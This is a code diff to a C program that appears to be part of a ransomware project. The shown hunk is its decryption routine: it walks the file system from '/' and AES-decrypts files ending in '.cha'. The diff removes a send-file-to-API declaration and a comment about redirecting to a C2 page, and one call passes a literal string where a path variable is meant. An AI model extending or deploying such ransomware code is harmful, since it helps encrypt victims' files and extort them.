@@ -19,17 +19,11 @@
 #include "files.h"
 #include "encryption.h"
 
-#define RSA_KEY_SIZE 4096
-
-void sendFileToApi(const char *path, const char *api);
-
-
-
 int main(){
 
     OpenSSL_add_all_algorithms();
     ERR_load_crypto_strings();
-    
+
     //Generate AES key and IV
     unsigned char key[32];
     size_t key_size = sizeof(key);
@@ -55,7 +49,7 @@ int main(){
 
     //List all the files we borrowed :O
 
-    const char *path = "/home";
+    const char *path = "/";
     PathList pathList;
     initPathList(&pathList);
 
@@ -70,15 +64,13 @@ int main(){
         if (strcmp(last_four, ".cha") == 0) {
             //printf("Strcmp result: %d\n", strcmp(last_four, ".cha")); // Debug
             //printf("Path: %s\nExtension: %s\n", current_path, last_four); // Debug
+
             //Decrypt each file with AES
             decryptFile(key, iv, aad, "pathList.paths[i]");
         }
     }
     freePathList(&pathList);
 
-
-
-    //Redirect to C2's web page for instructions
 
     return 0;
 }
